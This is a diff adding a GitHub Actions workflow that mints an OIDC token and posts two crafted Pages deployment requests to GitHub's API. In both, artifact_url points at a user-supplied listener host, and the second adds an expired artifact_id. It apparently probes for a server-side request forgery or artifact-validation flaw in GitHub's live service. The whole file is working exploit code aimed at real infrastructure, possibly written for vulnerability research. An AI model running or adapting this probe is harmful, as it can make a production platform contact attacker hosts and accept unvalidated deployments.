@@ -1,0 +1,39 @@
+name: pages-deploy-arms
+on:
+  workflow_dispatch:
+    inputs:
+      listener:   { required: true }
+      expired_id: { required: true }
+permissions: { contents: read, pages: write, id-token: write }
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: { name: github-pages }
+    steps:
+      - name: arms
+        env:
+          GH_TOKEN: ${{ github.token }}
+          LISTENER: ${{ inputs.listener }}
+          EXPIRED_ID: ${{ inputs.expired_id }}
+        run: |
+          set -u
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          BASE="$LISTENER/totally/arbitrary/not-a-pipelines-path"
+          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
+
+          echo "===== ARM A: artifact_url alone ====="
+          jq -nc --arg u "$BASE?arm=A" --arg s "$GITHUB_SHA" --arg t "$TOKEN" \
+            '{artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > a.json
+          curl -s -o aout.json -w "ARM_A_HTTP=%{http_code}\n" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" -d @a.json
+          jq -r '.message // "no message"' aout.json
+
+          echo "waiting 25s so any ARM A callback lands before ARM B"
+          sleep 25
+
+          echo "===== ARM B: the SAME url, plus the expired artifact_id ====="
+          jq -nc --arg u "$BASE?arm=B" --arg s "$GITHUB_SHA" --arg t "$TOKEN" --argjson id "$EXPIRED_ID" \
+            '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > b.json
+          curl -s -o bout.json -w "ARM_B_HTTP=%{http_code}\n" -X POST \
+            -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" -d @b.json
+          jq -r '.message // "accepted"' bout.json
